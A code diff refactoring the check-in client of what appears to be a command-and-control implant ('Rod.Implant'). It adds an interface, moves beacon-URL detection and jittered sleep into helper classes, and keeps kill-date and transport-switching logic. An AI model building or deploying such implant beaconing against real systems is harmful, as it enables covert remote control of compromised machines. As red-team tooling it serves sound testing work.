@@ -35,7 +35,7 @@ namespace Rod.Implant.Internal;
 /// refused on the task itself. Tasking keeps its signature and replay-nonce
 /// discipline regardless of transport (architecture.md Sec 9).
 /// </summary>
-internal sealed class EnvelopeBeacon
+internal sealed class EnvelopeBeacon : ICheckInClient
 {
     /// <summary>
     /// The envelope check-in route. Mapped on every web listener beside the
@@ -132,13 +132,11 @@ internal sealed class EnvelopeBeacon
     }
 
     /// <summary>
-    /// True when a beacon URL names a web front -- an http(s) URL -- whose
-    /// check-in the envelope POST cycle carries. A bare host:port (the mTLS
+    /// This client carries the web URL shape (architecture.md Sec 8): a
+    /// beacon URL naming an http(s) front. A bare host:port (the mTLS
     /// listener dial shape) belongs to the gRPC stream client instead.
     /// </summary>
-    public static bool IsWebBeaconUrl(string beaconUrl)
-        => beaconUrl.Trim().StartsWith("http://", StringComparison.OrdinalIgnoreCase)
-           || beaconUrl.Trim().StartsWith("https://", StringComparison.OrdinalIgnoreCase);
+    public bool Serves(string beaconUrl) => BeaconUrl.IsWeb(beaconUrl);
 
     /// <summary>
     /// Composes the check-in URL off a beacon URL: the scheme and authority
@@ -175,7 +173,7 @@ internal sealed class EnvelopeBeacon
                 _log.WriteLine($"beacon kill date {killDate:O} reached; terminating");
                 return CheckInExit.Terminate;
             }
-            if (!IsWebBeaconUrl(_egress.CurrentBeaconUrl))
+            if (!BeaconUrl.IsWeb(_egress.CurrentBeaconUrl))
                 return CheckInExit.SwitchTransport;
 
             var cycle = BeaconCycleResult.Dropped;
@@ -215,7 +213,7 @@ internal sealed class EnvelopeBeacon
             }
             try
             {
-                await Beacon.SleepWithJitterAsync(_sleep, _jitter, consecutiveFailures, cancellationToken);
+                await CheckInCadence.SleepWithJitterAsync(_sleep, _jitter, consecutiveFailures, cancellationToken);
             }
             catch (OperationCanceledException)
             {
